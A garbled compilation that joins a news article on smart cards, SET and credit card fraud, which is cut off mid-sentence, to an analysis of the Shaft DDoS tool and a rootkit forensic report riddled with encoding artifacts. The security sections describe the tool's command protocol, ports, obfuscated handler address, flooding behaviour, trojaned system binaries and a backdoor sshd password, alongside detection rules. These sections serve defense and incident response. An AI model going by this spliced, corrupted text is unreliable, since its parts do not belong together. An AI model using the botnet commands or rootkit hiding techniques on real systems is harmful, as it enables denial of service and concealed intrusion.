            .We see a lot of promise to the technology. There is a
     real customer need out there,. said Molly Fause, American
     Express spokesperson.
            
     BABY STEPS
            Still, .Blue. is just a toe in the water. Currently, the
     chip only adds convenience  it lets cardholders open a
     .digital wallet,. including billing information, with a single
     swipe. But it is not used by merchants to positively identify
     consumers; instead, the old-fashioned number is used, and it
     can be stolen and exploited just like traditional cards. 

            And thats been the problem for smart cards all along
      while European governments and institutions have
     aggressively supported the technology (for example,
     Germany has distributed 80 million cards to all users in its
     health care system), U.S. companies have taken baby steps.
     Davis points out that U.S. adoption is still likely to be
     among the slowest in the world. With aggressive initiatives in
     France and Germany already, he said most of Europe will
     have converted to smart cards by 2005, with major Latin
     American countries following soon after. 
            Still, the American Express initiative, while tepid, is
     important. The company wouldnt say how many Blue
     cards have been issued; Faust would only say the company
     has received twice as many applications as anticipated.
     Analyst Do said she experts 1.5 million Blue cards to be in
     consumers hands by years end.
            .Believe me, the rest of the issuers in the U.S. are
     closely following what American Express is doing,. he said.
     The real goal, he said, is to ply consumers with coupons and
     loyalty points they can download onto smart cards, which
     will make them an attractive proposition. .If American
     Express figures that out, the rest of the industry will react
     quickly..
            Still, getting Internet users to add hardware to their
     existing systems is a tremendous challenge. Davis speculates
     that many Blue owners dont bother to hook up the card
     reader, for example. And Do goes farther, suggesting that
     the need to add a card reader makes smart cards a
     non-starter in the consumer space. 

                                     But others say the
                              shift will be swift, once
                              consumers are convinced
                              about the benefits of
                              smart cards.
                                     .The last paradigm
          shift I would liken this to
      is the mouse,. said Rick McNeef, vice president of
      corporate development at Cybersafe Inc. .How long did it
      take us to get a mouse in conjunction with every
      keyboard?. He also thinks credit cards have built-in
      obsolescence, since they all have an expiration date, and
      most of our renewal cards will have chips inside. .Whatever
      you have in your wallet right now, the expiration date is
      three years or less. Theres an automatic replacement
      anyway..
      
      SET MAKES A COMEBACK 
      Additional hardware isnt the only available method for
      proving someone is who they say they are on the Internet.
      The SET (secure electronic transactions) protocol
      accomplishes that goal through software. In SET, each
      customer receives a unique digital certificate, the
      cyberworld equivalent of a real-life signature. The certificate
      is .wrapped. around each transaction, and unwrapped by
      banks at the other end  no more anonymous commerce. 
      
      .It transposes the physical world model into
      cyberspace,. said Orfie, speaking on behalf of SETCo.
      With each transaction, the consumer and the merchant must
      prove they are who they say they are, using the special SET
      digital authentication. That gives the bank an .irrefutable
      audit trail,. meaning criminals could be traced. More
      important, it satisfies the banks requirement for a signature
      on each transaction, meaning merchants wont receive those
      fraud chargebacks that are currently a part of doing
      business online.
      But SET, like smart cards, has been slow to get off the
      ground. First tested in 1996, the standard appeared to be
      dead in the water last year. The SETCo.org Web site lists
      only about 25 participating merchants. The extra decryption
      processes proved slow and cumbersome; standards
      werent set, and big e-commerce companies went with the
      now-familiar .SLL. instead.
      The fear when e-commerce was first introduced was
      that ingenious card thieves would listen in on data being
      slung around the Internet and pick off credit card
      information as it went by, much like a wire tap. So, much
      attention was given to Secure Socket Layer, or SSL,
      technology, which encrypts the information while its in
      transit. But SSL says nothing about whos at either end of
      the transaction. And unfortunately, cyber-eavesdropping
      has turned out to be a non-issue. The problems begin when
      the card number arrives at the merchant, who decrypts it.
      But the recent surge of high-profile credit card thefts,
      SET and its authentication capabilities are getting a new life,
      some say.
      .
      
      MSNBC research
      
      
      .Weve anticipated this problem, which is now rearing
      its ugly little head,. Orfie said. .Were saying we have a
      solution..
      Since SET requires a much less costly infrastructure
      upgrade, it may be the biggest benefactor from the slew of
      hack attacks, Analyst Do said. 
      .Its getting up and dusting itself off and starting to walk
      again,. she said. .Online hacking will definitely promote
      some kind of network security rather than smart cards.. 
      
      STORES ARENT BANKS
      With either a hardware or a software solution, most
      experts say that one fundamental change to the current
      payments system is required. Today, merchants are forced
      to act like banks. They are acquiring and storing personal
      financial records  namely, credit cards. 
      SET and any of the various smart card proposals can
      take this banking role away from retailers. In these new
      systems, consumers who hit .submit. on a Web site can
      send their purchase request to their own bank. Their bank
      then gives the money to the e-commerce store, along with
      some kind of unique identifying information. But personal
      bank account numbers, or credit card numbers, are never
      sent to the Web site.
      .The best place for the card to be is to remain in the
      banking system,. said Gerry Gay, vice president of sales
      and marketing at SafeTpay.com, Inc. His company recently
      launched a numeric keypad/card reader that acts like a
      mini-ATM when attached to a personal computer. The card
      reader immediately encrypts PIN numbers and card
      numbers and sends the data directly to banks. Merchants
      only receive their money and a tracking number.
      .You eliminate another arena where the data can be
      compromised,. Gay said. .As things are, youre entrusting
      your card data to someone whos outside the payment
      system..

     OLD-FASHIONED BARN RAISING
            Still, even with the increased impetus supplied by
     cybercrooks, smart cards or any other payment solution
     wont take over overnight. Old habits  at banks,
     merchants, and among consumers  die hard. Even if those
     old habits are costly.
            .The devil you know is better than the devil you dont
     know,. Gay said, describing his companys challenge in
     convincing banks and merchants to support his system.
            But no fright over fraud can overcome the challenges of
     an upgrade  in the case of smart cards, Analyst Do thinks
     a complete overhaul of the system will require $15 billion.
     Combine that with the fundamental change either SET or
     smart cards would hoist on consumers, and you have some
     formidable obstacles.
            That makes Barrett, of the Internet Fraud Prevention
     Advisory Council, leery.
            .A lot of these things create issues for consumers.
     Theyre moving the pain onto consumers and taking it away
     from merchants, and thats not going to work,. said Barrett,
     also an executive at Vitessa Corp., an online payment
     company.
            Thats why he thinks a very low-tech solution is needed
     to deal with credit card crooks. If Barrett had his way,
     companies like Amazon.com would open up their internal
     fraud databases to all e-merchants. Such an open policy
     would quickly create a list of suspicious e-mail addresses,
     Internet Service providers, and of course, credit card
     numbers. 
            .I try to encourage people to think about fraud
     detection as a public good,. he said. The proposal has so
     far fallen on deaf ears, as most merchants see their fraud
     data as top-secret proprietary information. .Merchants on
     the Internet have tendency to want to wall off and control
     and not share their kownledge or incidents of fraud.
            .Amazon doesnt compete as a fraud detection
     company. In so doing what theyre doing is hoarding
     information  If you live in a dangerous neighborhood, are
     you safe if you buy weapons? No. You still havent cleaned
     up the neighborhood. If the top 100 merchants on the Net
     put in place a technology that they could demonstrate
     immediately its hard for hackers, that would clean up the
     neighborhood..
            His proposal is not so far, surprisingly, from the
     community-based solution proposed by the Saint of
     E-Commerce. 
            .There should be an Internet Bureau of Commerce that
     can list every single person on the Internet who accepts
     credit cards and people should be invited to try to break
     in,. Curador said. .And if you can, then they are listed as
     unsafe..
            Such lists already exist  but they are shared only
     among members of the Internet underground, and like
     Curadors notorious Web page, come and go under cover
     of Internet anonymity. That means, for now, the bad guys
     appear to be much better at sharing information than the

      -- 1. Introduction
      ------------------
      
        This is an analysis of the "Shaft" distributed denial of service
        (DDoS) tool. Denial of service is a technique to deny access to a
        resource by overloading it, such as packet flooding in the network
        context. Denial of service tools have existed for a while, whereas
        distributed variants are relatively recent. The distributed nature
        adds the "many to one" relationship.  Throughout this analysis, most
        actual host names have been modified or removed.
        
      -- 2. Historical overview
      -------------------------
      
        "Shaft" belongs in the family of tools discussed earlier, such as 
        Trinoo, TFN, Stacheldraht, and TFN2K. Like in those tools, there are
        handler (or master) and agent programs. The general concepts of these
        tools can be found in a Distributed Intruder Tools Workshop Report held
        in November 1999 at the Computer Emergency Response Team Coordination
        Center (CERT/CC) in Pittsburgh, Pennsylvania:
      
               http://www.cert.org/reports/dsit_workshop.pdf 
       
        In chronological order, there are Trinoo, TFN, Stacheldraht, Shaft, and
        TFN2K. Trinoo, TFN, and Stacheldraht were analyzed in [5], [6], and [7] 
        respectively. TFN2K was recently analyzed in [1].
      
        In the first two months of 2000, DDoS attacks against major Internet
        sites (such as CNN, ZDNet, Amazon etc.) have brought these tools
        further into the limelight. There are a few papers covering DDoS to
        be found at:

      -- 3. Analysis
      --------------
      
        Shaftnode was recovered, initially in binary form, in late November
        1999, then in source form for the agent. Distinctive features are
        the ability to switch handler servers and handler ports on the fly,
        making detection by intrusion detection tools difficult from that
        perspective, a "ticket" mechanism to link transactions, and the
        particular interest in packet statistics.
        
      -- 3.1 The network: client(s)-->handler(s)-->agent(s)-->victim(s)
      -----------------------------------------------------------------
      
        The "Shaft" network is made up of one or more handler programs
        ("shaftmaster") and a large set of agents ("shaftnode").  The attacker
        uses a telnet program ("client") to connect to and communicate with the
        handlers. A "Shaft" network would look like this:
        
                         +--------+             +--------+
                         | client |             | client |
                         +--------+             +--------+
                             |                      |
              . . . --+------+---------------+------+----------------+-- . . .
                      |                      |                       |
                      |                      |                       |
                +-----------+          +-----------+           +-----------+
                |  handler  |          |  handler  |           |  handler  |
                +-----------+          +-----------+           +-----------+
                      |                      |                       |
                      |                      |                       |
      . . . ---+------+-----+------------+---+--------+------------+-+-- . . .
               |            |            |            |            |
               |            |            |            |            |
           +-------+    +-------+    +-------+    +-------+    +-------+
           | agent |    | agent |    | agent |    | agent |    | agent |
           +-------+    +-------+    +-------+    +-------+    +-------+
      
      
           
      -- 3.2 Network Communication
      ----------------------------
      
        Client to handler(s):  20432/tcp
        Handler to agent(s):   18753/udp
        Agent to handler(s):   20433/udp
        
        "Shaft" (in the analyzed version, 1.72) is modeled after Trinoo, in that
        communication between handlers and agents is achieved using the 
        unreliable IP protocol UDP. See Stevens [18] for an extensive discussion of 
        the TCP and UDP protocols. Remote control is via a simple telnet connection
        to the handler. "Shaft" uses "tickets" for keeping track of its individual
        agents. Both passwords and ticket numbers have to match for the agent to
        execute the request. A simple letter-shifting (Caesar cipher, see Schneier
        [17]) is in use. 
        
      -- 3.3 Commands
      ---------------
      
        The command structure is divided into the agent and handler command
        syntax groups.  The attacker interacts with the handler via a command
        line.
      
      -- 3.3.1 Agent Command Syntax
      
        Accepted by agent and replies generated back to the handler:  
      
              size <size>
                  Size of the flood packets.
                  
                  Generates a "size" reply.
              
              type <0|1|2|3>
                  Type of DoS to run 
                  0 UDP, 1 TCP, 2 UDP/TCP/ICMP, 3 ICMP
                  
                  Generates a "type" reply.
                  
              time <length>
                  Length of DoS in seconds
                  
                  Generates a "time" reply.
                  
              own <victim>
                  Add victim to list of hosts to perform denial of service on
                  
                  Generates a "owning" reply.
                  
              end <victim>
                  Removes victim from list of hosts (see "own" above)
                  
                  Generates a "done" reply.
                  
              stat 
                  Requests packet statistics from agent
                  
                  Generates a "pktstat" reply.
                  
              alive
                  Are you alive?
                  
                  Generates a "alive blah" reply.
                  
              switch <handler> <port>
                  Switch the agent to a new handler and handler port
                  
                  Generates a "switching" reply.
                  
              pktres <host>
                  Request packet results for that host at the end of the flood
                  
                  Generates a "pktres" reply.
              
              
        Sent by agent:
              
              new <password>
              
                  Reporting for duty
              
              pktres <password> <sock> <ticket> <packets sent>
              
                  Packets sents to the host identified by <ticket> number
              
                  
      -- 3.3.2 Handler (shaftmaster) Command Syntax
      
        Little is known about the handler, but this is a speculation, pieced
        together from clues, of how its command structure could look like:
                
                mdos <host list>
                    Start a distributed denial of service attack (mdos = massive
                    denial of service?) directed at <host list>.
                        
                        Sends out "own host" messages to all agents.
                        
                edos <host list>
                    End the above attack on <host list>.
                        
                        Sends out "end host" messages to all agents.
                        
                time <length>
                    Set the duration of the attack.
                        
                        Sends out "time <length>" to all agents.
                        
                size <packetsize>
                    Set the packetsize for the attack (8K maximum as seen in
                    source).
                        
                        Sends out "size <packetsize>" to all agents.
                
                type <UDP|TCP|ICMP|BOTH>
                    Set the type of attack, UDP packet flooding, TCP SYN
                    packet flooding, ICMP packet flooding, or all three (here
                    BOTH = ICMP amd IP protocols)
              
                        Sends "type <type>" to all agents.
                        
                +node <host list>
                    Add new agents
                        
                -node <host list>
                    Remove agents from pool
                        
                ns <host list>
                    Perform a DNS lookup on <host list>
                        
                lnod 
                    List all agents
                        
                ltic
                    List all tickets (transactions?)
                        
                pkstat
                    Show total packet statistics for agents
                        
                        Sends out "stat" request to all agents.
                        
                alive
                    Send an "alive" to all agents.
                    
                    A possible argument to alive is "hi"
                        
                stat
                    show status?
                        
                switch
                    become the handler for agents
                        
                        Send "switch" to all agents.
                        
                ver
                    show version
                        
                exit
                
      
      -- 3.4 Password protection
      --------------------------
      
        After connecting to the handler using the telnet client, the attacker
        is prompted with "login:". Too little is known about the handler or 
        its encryption method for logging in. A cleartext connection to the handler
        port is obviously a weakness. 
      
      -- 3.5 Detection
      ----------------
      
      -- 3.5.1 Binaries and their behavior
      
        As with previous DDoS tools, the methods used to install the handler/agent 
        will be the same as installing any program on a compromised Unix system, 
        with all the standard options for concealing the programs and files (e.g.,
        use of hidden directories, "root kits", kernel modules, etc.) The 
        reader is referred to Dittrich's Trinoo analysis [5] for a description of
        possible installation methods of this type of tool. 
      
        Precautions have been taken to hide the default handler in the binary code.
        In the analyzed code, the default handler is defined as follows:
              
              #define MASTER          "23:/33/75/28" 
              
        which would translate into 129.22.64.17 (electrochem1.echem.cwru.edu)
        using the same simple cipher mentioned above. Port numbers are munged
        before actual use, e.g. 
      
          #define MASTER_PORT     20483
          
        is really port 20433.
      
        All these techniques intend to hide the critical information from prying
        eyes performing forensics on the code. The program itself tries to hide
        itself as a legitimate Unix process (httpd in the default configuration).
      
        Looking at strings in the shaftnode application reveals the following:
              
          > strings -n 3 shaftnode 
          pktres
          switch
          alive
          stat
          end
          own
          time
          type
          size
          httpd
          23:/33/75/28               
          Unable to fork. (do it manually)
          shift
          new %s
          size %s %s %s %s
          type %s %s %s %s
          time %s %s %s %s
          owning %s %s %s %s
          switched %s %s %s
          done %s %s %s %s
          pktstat %s %s %s %lu
          alive %s %s %s blah
          %d.%d.%d.%d
          Error sending tcp packet from %s:%i to %lu:%i
          pktres %s %i %i %lu
      
      
        Upon launch, the "Shaft" agent (the "shaftnode") reports back to its
        default handler (its "shaftmaster") by sending a "new <upshifted
        password>" command. For the default password of "shift" found in the
        analyzed code, this would be "tijgu".  Therefore a new agent would send
        out "new tijgu", and all subsequent messages would carry that password in
        it. Only in one case does the agent shift in the opposite direction for
        one particular command, e.g. "pktres rghes". It is unclear at the moment
        whether this is intentional or not.
      
        Incoming commands arrive in the format:
      
        "command <upshifted password> <command arg> <socket> <ticket> <optional args>"
      
        For most commands, the password and socket/ticket need to have the right magic
        in order to generate a reply and the command to be executed.
      
        Message flow diagram between handler H and agent A:
        
               Initial phase:    A -> H: "new", f(password)
                Running loop:    H -> A: cmd, f(password), [args], Na, Nb 
                                 A -> H: cmdrep, f(password), Na, Nb, [args]
                                                 
                      - f(X) is the Caesar cipher function on X
                      - Na, Nb are numbers (tickets, socket numbers)
                      - cmd, cmdrep are commands and command acknowledgments
                      - args are command arguments
      
        The flooding occurs in bursts of 100 packets per host, with the source
        port and source address randomized. This number is hard-coded, but it is
        believed that more flexibility can be added. Whereas the source port
        spoofing only works if the agent is running as a root privileged process,
        the author has added provisions for packet flooding using the UDP protocol
        and with the correct source address in the case the process is running as a
        simple user process. It is noteworthy that the random function is not
        properly seeded, which may lead to predictable source port sequences and
        source host IP sequences. 
       
            Source port = (rand() % (65535-1024)+1024)   where % is the 
                                                         mathematical 'mod' operator
                                                         
        This will generate source ports greater than 1024 at all times.
      
            Source IP =  rand()%255.rand()%255.rand()%255.rand()%255
      
        The source IP numbers can (and will) contain a zero in the leading 
        octet.
      
        Additionally, the sequence number for all TCP packets is fixed, namely
        0x28374839, which helps with respect to detection at the network level.
        The ACK and URGENT flags are randomly set, except on some platforms.
        Destination ports for TCP and UDP packet floods are randomized. 
      
        The client must choose the duration ("time"), size of packets, and type
        of packet flooding directed at the victim hosts. Each set of hosts has its
        own duration, which gets divided evenly across all hosts. This is unlike TFN
        [2] which forks an individual process for each victim host. For the type,
        the client can select UDP, TCP SYN, ICMP packet flooding, or the combination
        of all three. Even though there is potential of having a different type and
        packet size for each set of victim hosts, this feature is not exploited
        in this version.
         
        The author of "Shaft" seems to have a particular interest in statistics,
        namely packet generation rates of its individual agents. The statistics on 
        packet generation rates are possibly used to determine the "yield" of the 
        DDoS network as a whole. This would allow the attacker to stop adding hosts
        to the attack network when it reached the necessary size to overwhelm the
        victim network, and to know when it is necessary to add more agents to
        compensate for loss of agents due to attrition during an attack (as the
        agent systems are identified and taken off-line.)
      
        Currently, the ability to switch host IP and port for the handler exists,
        but the listening port for the agent remains the same. It is foreseeable
        that this will change in the future.
      
      -- 3.5.2 A sample attack
      
        In this section we will look at a practical example of an attack carried
        out with the "Shaft" distributed denial of service attack tool, as seen
        from the attacking network perspective.

        As one can see, the agent is waiting to receive commands on its default
        UDP port number 18753. The TCP connection back to the handler remains
        unexplained to date.

        There is quite some activity between the handler and the agent, as they
        go through the command request and acknowledgement phases. There 
        was also what appeared to be testing of the impact on the local 
        network itself with ICMP packet flooding, for which we omit the data 
        here due to size limitations.
        
        Let us look at the individual phases from a later attack.
        
        Setup and configuration phase:
              
        date        time      src              dest         dest-port command

        The handler issues an "alive" command, and says "hi" to its agent,
        assigning a socket number of "5" and a ticket number of 8170. We will see
        that this "socket number" will persist throughout this attack. A time
        period of 700 seconds is assigned to the agent, which is acknowledged. A
        packet size of 4096 bytes is specified, which is again confirmed.  The
        last line indicates the type of attack, in this case "the works", i.e.
        UDP, TCP SYN and ICMP packet flooding combined. Failure to specify the type
        would make the agent default to UDP packet flooding.
      
        Now the list of hosts to attack and which ones they want statistics from
        on completion:
      
        date        time      src              dest         dest-port command

        Now that all other parameters are set, the handler issues several "own"
        commands, in effect specifying the victim hosts. Those commands are
        acknowledged by the agent with an "owning" reply. The flooding occurs as
        soon as the first victim host gets added. The handler also requests
        packet statistics from the agents for certain victim hosts (e.g. "pktres
        tijgu 207.229.143.6 5 1993"). Note that the reply comes back with the
        same identifiers ("5 1993") at the end of the 700 second packet flood,
        indicating that 51600 sets of packets were sent. One should realize that,
        if successful, this means 51600 x 3 packets due to the configuration of
        all three (UDP, TCP, and ICMP) types of packets. In turn, this results
        in roughly 220 4096 byte packets per second per host, or about 900 
        kilobytes per second per victim host from this agent alone, about 4.5 
        megabytes per second total for this little exercise. 
      
        Note the reverse shift ("shift" becomes "rghes", rather than "tijgu") for
        the password on the packet statistics.
        
      
      -- 3.5.3 Detection at the network level
        
        Scanning the network for open port 20432 will reveal the presence of a
        handler on your LAN. 
        
        For detecting idle agents, one could write a program similar to George
        Weaver's trinoo detector. Sending out "alive" messages with the default
        password to all nodes on a network on the default UDP port 18753 will
        generate traffic back to the detector, making the agent believe the
        detector is a handler.
        
        This program does not provide for code updates (like TFN or Stacheldraht).
        This may imply "rcp" or "ftp" connections during the initial 
        intrusion phase (see also [5]).
        
        The program uses UDP traffic for its communication between the handlers
        and the agents. Considering that the traffic is not encrypted, it can
        easily be detected based on certain keywords. Performing an "ngrep" [11]
        for the keywords mentioned in the syntax sections (3.3.1 and 3.3.2), will
        locate the control traffic, and looking for TCP packets with sequence
        numbers of 0x28374839 may locate the TCP SYN packet flood traffic. 
        Source ports are always above 1024, and source IP numbers can 
        include zeroes in the leading octet.
      
        Strings in this control traffic can be detected with the "ngrep"
        program using the same technique shown in [5], [6], and [7]. For 
        example,
      
        # ngrep -i -x "alive tijgu" udp
        
        # ngrep -i -x "pktres|pktstat" udp
        
        will locate the control traffic between the handler and the agent, 
        independently of the port number used.
      
        There are also two excellent scanners for detecting DDoS agents on the 
        network: Dittrich's "dds" [8] and Brumley's "rid" [2]. 
        
        "dds" was written to provide a more portable and less dependant
        means of scanning for various DDoS tools. (Many people encountered
        problems with Perl and the Net::RawIP library [15] on their systems,
        which prevented them from using the scripts provided in [5], [6],
        and [7].) Due to time contraints during coding, "dds" does not have
        the flexibility necessary to specify arbitrary protocols, ports, and
        payloads. A modified version of "dds", geared towards detecting only
        "Shaft" agents, is included in the Appendix.
          
        A better means of detecting "Shaft" handlers and agents would be to
        use a program like "rid", which uses a more flexible configuration
        file mechanism to define ports, protocols, and payloads.
        
        A sample configuration for "rid" to detect the "Shaft" control traffic 
        as described:
        
        start shaft
              send udp dport=18753 data="alive tijgu hi 5 1918" 
              recv udp sport=20433 data="alive" nmatch=1
        end shaft
      
      -- 3.6 Defenses
      ---------------
        
        To protect against the effects of the multiple types of denial of
        service, we suggest that you review the other papers (see [1, 3, 5, 6, 
        7]) and other methods of dealing with DDoS attacks being discussed 
        and promoted (see [9]).
      
        For example, rate-limiting is considered effective against ICMP packet
        flooding attacks, while anti-spoof filters and egress filters at the
        border routers can limit the problems caused by attacking agents
        faking source addresses.
      
      -- 4. Further evolution
      -----------------------
      
        While the author(s) of this tool did not pursue the use of encryption
        of its control traffic, such an evolution is conceivable, since a Caesar
        cipher is used to obfuscate the password. A transition to Blowfish or 
        other stream ciphers is realistic, and changing the communication protocol
        to ICMP, much like TFN, is conceivable. The use of multicast protocols 
        for both communication or packet flooding is also possible.
      
        To date, no source for the "Shaft" handler ("shaftmaster") has been 
        obtained of analyzed.
      
        At this stage, the code is believed to be private.  This would mean that
        the authors could likely change defaults and the probability of detecting
        "script kiddie" copycats using default values as analyzed here is low.
        This would argue for rapid and widespread detection efforts to identify
        agents before this change.
      
      -- 5. Conclusion
      ----------------
      
        "Shaft" is another DDoS variant with independent origins. The code
        recovered did appear to be still in development. Several key
        features indicate evolutionary trends as the genre develops.
        Of significance is the priority placed on packet generation
        statistics which would allow host selection to be refined. The
        analysis of the code and binary was greatly enhanced by the capture
        of attack preparation and command packets. The captured packets 
        made it possible to assess the impact of a single agent that managed
        to saturate the network pipe.
        
        The version analyzed had hooks which would allow for dynamic changes
        to the master host and control port but not the agent control port.
        However such items are trivially incorporated and must not be taken
        to be indicative of any current versions which may be in active use.
        The obfuscation of master IP, ports and passwords used a relatively
        simple form of encryption but this could easily be strengthened.
      
        The detection of DDoS installations will become very much more
        difficult as such metamorphosis techniques progress, the presence of
        such agents will still be more readily determined by analysis of
        traffic anomalies with a consequent pressure on time and resources
        for site administrators and security teams.

      Section 0: Introduction
      =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
      
      This analysis is in addition to Sven Dietrich's analysis, dated March 16, 2=
      000,
      of the Shaft DDoS tool.  The analysis we provide here is a description of t=
      he
      rootkit used and the methods of distribution of the tool. We share this=20
      information so that other site and system administrators can examine their
      systems for comprimise and use as Shaft nodes.=20
      
      Note:  This file can be found at:
        http://biocserver.cwru.edu/~jose/shaft_analysis/
      
      The user names and host ID's have been munged.  We have tried to contact the
      domain admins whose networks have appeared anywhere in any of these files.
      
      ---------[ How We Found This Information
      
      Once we were alerted that our machine may have been compromised, we perform=
      ed
      both network and host based scans.  A network port scan (using nmap) reveal=
      ed
      port 5002/tcp open and listening.  Furthermore, it revealed port 22/tcp (ss=
      h)
      open, which was not installed by the system administrator.
      
      A host based scan revealed similarly that port 5002/tcp was listening.  An
      analysis with rpm -Va revealed differences in sizes and MD5 sums for the
      components of the root kit, but did not reveal the Shaft toolkit.  At this =
      time
      the system was taken offline and the disk was mounted in another trusted sy=
      stem
      and analyzed from there. =20
      
      Local administrators had noted that the system had become unstable over aut=
      umn,
      corresponding to the tests of the Shaft DDoS tool. =20

      ----------------[ What We Found
       =20
      One of the significant things we found while analyzing the box was a direct=
      ory
      and set of files that I will call the sda69 toolkit.  It was found in /dev
      (/dev/sda69 and 4 files sda69[a-d]).  This appears to be the attackers work=
      ing
      directory, so most of their scripts and files are stored there.
      
      It appears that much of their older work from when they originally compromi=
      sed=20
      the box was stored in a subdirectory called ". " (dot space, "/dev/sda69/. =
      ").
      This directory contained 6 files that compromised a system for sniffing the
      ethernet network and analyzing the sniffer logs.  Here is a list of files a=
      nd
      what they do:
      
        -rwxr-xr-x   1 0        20          28969 Apr  4  1999 idle
      
      This was their sniffer.  It was designed to sniff ports 21/tcp and 23/tcp (=
      ftp=20
      and telnet, respectively).  It was capture the first x number of bytes of e=
      ach
      connection, log them to a file, and move on to the next connection.  This w=
      as
      used to gather passwords, since both ftp and telnet send passwords over
      plaintext.  This sniffer only logged in one direction (the data flowing from
      the machine that started the connection to the destination machine).  This =
      was
      done because the other direction rarely contains useful information.  The
      output file in this case was tcp.log.  The program was named idle probably =
      to
      fool any sysadmin who noticed it in ps and make them believe it was just id=
      le
      time.
      
        -rw-r--r--   1 0        0          456799 Jun 11  1999 tcp.log
      
      This was their sniffer log.  It contained data in the form:
      src_ip =3D> dst_ip [port]
      data
      =2E..
      
      ----- [method of connection termination]
      This log only contained information for ports 21 and 23.  It did also conta=

      --------[ Linux Trojan Horse Programs Found
      
      Investigation of the Linux host comprimised yielded the following trojan
      horse programs. They were found by mounting the disc read-only and without
      executable permissions set. A full recursive file listing was then=20
      performed (ls -lartRi /mnt) which quickly revealed the trojan horse binarie=
      s:
      
        20563 -rwxrwxr-x   1 root     root       437428 Sep 15  1998 vi
        20554 -rwxrwxr-x   1 root     root       262756 Oct  2  1998 tcsh
       313370 -r-xrwxr-x   1 root     root        31312 Oct  3  1998 ps
      
      Examination of the binaries using strings(1), together with additional files
      on the system, reveals the method of operation of the new binaries.=20
      
      The file sizes were sometimes larger, most likely due to being statically
      linked against an older C library (libc5 on a libc6 system).
      
      On a running host, examination by using RPM in verify mode (rpm -Va) showed
      file sizes, permissions and MD5 sums were off when compared to the database
      on the system.=20
      
              ls
      
      The ls trojan we found has the effect of not listing files listed in a=20
      hidden configuration file, /dev/sda69c. As such, it's highly extensible.=20
      Several utiities were hidden, including elements of the Shaft toolkit and
      even some terminals.
      
              netstat
      
      Examination of the replaced netstat binary reveals that it is used to
      hide connections to or from certain networks and on certain ports. The
      networks and ports were configured using the file /dev/sda69b, an additional
      element of the rootkit.
      
              ps
      
      Again, used to hide activity. The trojan horse ps(1) binary makes a referen=
      ce
      to the file /dev/sda69a, which contains a listing of processes and terminals
      to hide. A fairly typical rootkit listing, including sniffers, scanners,
      the eggdrop IRC script, and the backdoored sshd.
      
              updatedb
      
      The program updatedb(1L), normally a link to slocate(1), was replaced with=
      =20
      shell script. Again, used to hide signs of the rootkit tools.
      
              locate
      
      Similar to updatedb's trojan, used to hide the rootkit and Shaft toolkit.
      
              find
      
      Again, used to hide the toolkits, calls the file /dev/sda69c in a similar
      way to the ls trojan to hide files.
      
              dir
              vdir
      
      See ls, used in the same fashion.
      
              killall
      
      Replaced, calls /dev/sda69a, a listing of processes and terminals. Used to
      prevent the halting of the intruder's processes.=20
      
              syslogd
      
      Replaced, calls /dev/sda69d, a list of domains. Presumably it prevents logg=
      ing
      when hosts from these domains connect.
      
              tcpd
      
      The TCP wrappers executable, calls /dev/sda69b and prevents access checking
      from those networks and on those ports.
      
              inetd
      
      Appears to be a combined portmapper and inetd daemon, perhaps to allow for
      access or system control via RPC calls.
      
              sshd
      
      Trojaned sshd 1.2.26, static linked against libc5.  Contains a backdoor
      password "rOOTkIT" which yeilds a root shell without logging.
      
              ifconfig
      
      Replaced, with the trojan version omitting any reporting of the PROMISC=20
      setting, hiding the use of the sniffing software.
      
      
      -----------[ Solaris SPARC Trojans Found
      
      During the course of our investigation into the toolkit, we also found seve=
      ral
      key binaries for Solaris as trojan horse programs. Witin the archive (neet.=
      tar)
      there is a script plus several binary replacement for the SPARC acrhitectur=
      e.
      The script installs an inetd trojan, a ps and update trojan as well. These
      are then run. Log wiping is also done. System comprimise is presumably
      through a known exploit. We performed no real analysis on the trojan horse
      programs for SPARC as we did not examine a Solaris node of the Shaft tool.
      
      
        -rwx------   1 510      510         39544 Mar 18  1999 doc
      
      This appears to be their trojaned SPARC Solaris inetd binary.
      
        -rwx------   1 510      510         24356 Mar 18  1999 ps
      
      This appears to be their trojaned SPARC Solaris ps binary.
      
        -rwx------   1 510      510         25548 Mar 18  1999 update
      
      Solaris does not use update, though SunOS 4.x did. This is probably to=20
      confuse the administrator should they stumble across the file. According to
      George Weaver <weaver@gabriel.nso.psu.edu> this is a standard solsniffer, a
      Solaris sniffer. The logfiles are expected to be in /usr/man/tmp/output on=
      =20
      infected Solaris boxes. =20
      
      
      ----------[ Trojan Executable Configuration Files
      
      In addition to these files, four more files were recovered that appear to
      contain information used by the rootkit that was installed on this system.
      These files are /dev/sda69[a-d].  Here is a listing of what is contained in
      these files:
      
        sda69a
      
      This file has the format:
      <number> <name>
      where number indicates what type of information follows (always either 1 or=
       3)
      and name indicates the data.  For this file, 1 indicates that what follows =
      is a
      terminal name, and 3 indicates that what follows is a executable name.  This
      file is used by the trojaned ps and killall to prevend the sysadmin from se=
      eing
      or killing the executables listed here, or anything from the listed termina=
      ls.
      The contents of the file:
      
      3 egg
      3 linsniffer
      1 p0
      1 p1
      3 sniffer
      3 mscan
      3 bash
      3 idle
      3 screen
      3 ssynk4
      3 sshd
      3 ssh
      3 sshd1
      3 s
      
        sda69b
      =20
      The format of this file is the same as the format of sda69a, but the conten=
      ts
      differ.  The 1 in this case means that the data is a subnet to ignore.  The=
       3
      in this case is a specific port number.  This file is used by the trojaned
      netstat and tcpd to know which IP's to hide, which IP's to always let in,
      and which ports to hide.  An example contents follows:
      
      
      1 xxx.
      3 6667
      1 yyy.
      3 23
      1 zzz.
      1 ddd.eee
      1 ccc.
      3 513
      1 bbb.aaa.
      3 22
      
      Here, the three letter combinations represent single numbers from IP addres=
      ses.=20
      This file would specify that everyone from xxx.*.*.* would be allowed in th=
      is
      machine, and no connections from these IP's would appear in netstat.  Also,
      programs listening on ports 6667, 23, 513, and 22 (irc, telnet, rlogin, and
      ssh) would not appear in a normal netstat.
      
        sda69c
      
      This file is a list of files, one file per line, that were installed on this
      system by the attackers.  This file is used by ls, dir, vdir, and find to k=
      now
      what files not to list when the admin tries to look through the filesystem.
      
        sda69d
      
      This file is a list of providers, one per line.  This file is used by the
      trojaned syslog to know what messages should not be logged.

      =3D=3D
      
      Their more recent work (which includes working with the Shaft DDoS tool) is=
       all
      in the base sda69 directory (/dev/sda69).  Here is a list of files recovered
      and what the do:
      
        -rwxr-xr-x   1 0        0           25123 Nov 28 14:34 shaftmaster
        -rwxr-xr-x   1 0        0           15184 Nov 28 14:47 shaftnode
      
